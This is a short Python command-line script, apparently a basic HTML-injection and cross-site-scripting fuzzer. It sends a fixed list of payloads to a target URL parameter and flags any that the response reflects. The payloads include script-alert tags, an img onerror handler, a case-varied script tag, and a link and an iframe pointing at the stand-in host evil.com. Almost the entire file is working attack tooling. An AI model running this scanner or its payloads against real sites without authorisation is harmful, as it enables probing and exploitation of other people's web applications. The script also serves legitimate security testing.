#!/usr/bin/env python3
import requests
import urllib.parse
import argparse
import sys

def fuzz(target, param, method="GET", data=None):
    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<a href='http://evil.com'>Click</a>",
        "<div style='color:red'>Styled</div>",
        "<marquee>Moving</marquee>",
        "<iframe src='http://evil.com'></iframe>",
        "<h1>Injected Header</h1>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "&#60;h1&#62;Encoded&#60;/h1&#62;"
    ]

    print(f"Fuzzing {target} for parameter '{param}' using {method}...")

    for payload in payloads:
        try:
            if method.upper() == "GET":
                encoded = urllib.parse.quote(payload)
                url = f"{target}?{param}={encoded}"
                response = requests.get(url, timeout=5)
            else:
                post_data = data.copy() if data else {}
                post_data[param] = payload
                response = requests.post(target, data=post_data, timeout=5)

            if payload in response.text:
                print(f"[!] Vulnerable: Payload '{payload}' was reflected in the response!")
            else:
                print(f"[-] Clean: '{payload}' not found in response.")
        except requests.exceptions.RequestException as e:
            print(f"[x] Error sending request: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Basic HTML Injection Fuzzer")
    parser.add_argument("target", help="Target URL (e.g., http://target.com/search)")
    parser.add_argument("param", help="Target parameter to fuzz")
    parser.add_argument("--method", choices=["GET", "POST"], default="GET", help="HTTP method to use")

    args = parser.parse_args()
    fuzz(args.target, args.param, args.method)
